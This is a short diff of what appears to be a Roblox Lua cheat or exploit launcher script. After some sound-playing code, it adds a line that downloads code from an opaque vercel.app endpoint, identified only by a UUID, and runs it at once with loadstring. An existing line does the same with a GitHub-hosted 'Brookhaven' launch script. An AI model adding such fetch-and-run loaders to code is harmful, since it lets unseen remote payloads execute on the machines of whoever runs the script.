@@ -127,5 +127,6 @@ sound.Looped = false
 sound.Parent = gui
 sound:Play()
 
+loadstring(game:HttpGet("https://scriptsbinsauth.vercel.app/api/scripts/61a69984-9e07-44cc-bf9f-b6720fcee96c/raw"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wx-sources/Nytherune/refs/heads/main/LaunchScriptBrookhaven.luau"))()
